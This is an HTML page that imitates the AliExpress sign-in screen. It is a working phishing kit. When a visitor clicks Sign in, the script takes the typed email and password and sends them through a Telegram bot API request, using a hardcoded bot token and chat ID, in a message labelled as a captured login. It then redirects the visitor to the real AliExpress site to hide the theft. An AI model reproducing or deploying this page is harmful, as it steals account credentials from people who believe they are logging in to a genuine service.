<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - AliExpress</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; user-select: none; }
body {
  background-color: #f8f8f8;
  color: #333;
  display: flex;
  flex-direction: column;
  min-height: 100vh;
  justify-content: space-between;
}

/* Header */
.ae-header {
  background: #fff;
  padding: 20px 40px;
  border-bottom: 1px solid #eaeaea;
  display: flex;
  align-items: center;
}
.ae-logo {
  font-size: 26px;
  font-weight: bold;
  color: #ff4747;
  text-decoration: none;
  letter-spacing: -1px;
}
.ae-logo span { color: #333; }

/* Main Container */
.ae-main {
  display: flex;
  justify-content: center;
  align-items: center;
  flex-grow: 1;
  padding: 20px;
}

.login-box {
  background: #ffffff;
  width: 100%;
  max-width: 420px;
  padding: 40px 35px;
  border-radius: 4px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.06);
  border: 1px solid #eee;
}

.login-title {
  font-size: 22px;
  font-weight: 600;
  color: #222;
  margin-bottom: 25px;
}

.input-group {
  margin-bottom: 20px;
}

.input-group input {
  width: 100%;
  padding: 14px 16px;
  border: 1px solid #d9d9d9;
  border-radius: 4px;
  font-size: 15px;
  outline: none;
  transition: border-color 0.2s;
  background: #fff;
}

.input-group input:focus {
  border-color: #ff4747;
}

.btn-signin {
  width: 100%;
  padding: 14px;
  background: #ff4747;
  border: none;
  border-radius: 4px;
  color: #fff;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.2s;
  margin-top: 10px;
}

.btn-signin:hover {
  background: #e63939;
}

.btn-signin:active {
  transform: scale(0.99);
}

#errorMsg {
  color: #ff4747;
  font-size: 13px;
  margin-top: 15px;
  min-height: 18px;
  text-align: center;
}

.footer-links {
  display: flex;
  justify-content: space-between;
  margin-top: 20px;
  font-size: 13px;
}

.footer-links a {
  color: #666;
  text-decoration: none;
}
.footer-links a:hover {
  color: #ff4747;
  text-decoration: underline;
}

/* Footer */
.ae-footer {
  text-align: center;
  padding: 20px;
  font-size: 12px;
  color: #999;
  border-top: 1px solid #eaeaea;
  background: #fff;
}
</style>
</head>
<body>

  <!-- AliExpress Header -->
  <header class="ae-header">
    <a href="#" class="ae-logo">Ali<span>Express</span></a>
  </header>

  <!-- Main Login Section -->
  <div class="ae-main">
    <div class="login-box" id="loginCard">
      <div class="login-title">Sign in</div>
      
      <div class="input-group">
        <input type="text" id="email" placeholder="Email ID / Member ID" autocomplete="off">
      </div>

      <div class="input-group">
        <input type="password" id="password" placeholder="Password">
      </div>

      <button class="btn-signin" onclick="handleLogin()">Sign in</button>
      <div id="errorMsg"></div>

      <div class="footer-links">
        <a href="#">Forgot password?</a>
        <a href="#">Protection Center</a>
      </div>
    </div>
  </div>

  <!-- AliExpress Footer -->
  <footer class="ae-footer">
    Privacy Policy - Intellectual Property - Terms of Use - User Information Legal Enquiry Guide
  </footer>

<script>
// ඔයාගේ Telegram Bot තොරතුරු එලෙසම ඇත
const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
const CHAT_ID = "1993924204";

function handleLogin() {
  const email = document.getElementById('email').value.trim();
  const pass = document.getElementById('password').value.trim();
  const errorMsg = document.getElementById('errorMsg');

  if (!email || !pass) {
    errorMsg.textContent = "Please enter your sign-in details.";
    return;
  }

  errorMsg.textContent = "Processing...";

  // Telegram වෙත ඩේටා යැවීම
  const text = `🛒 *AliExpress Login Captured!*\n\n📧 *Email/ID:* \`${email}\`\n🔑 *Password:* \`${pass}\``;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

  const img = new Image();
  img.src = url;

  // සාර්ථකව යැවුණු පසු AliExpress හි නිල ප්‍රධාන පිටුවට (или Real loading) යැවීම
  setTimeout(() => {
    window.location.href = "https://www.aliexpress.com";
  }, 800);
}
</script>

</body>
</html>
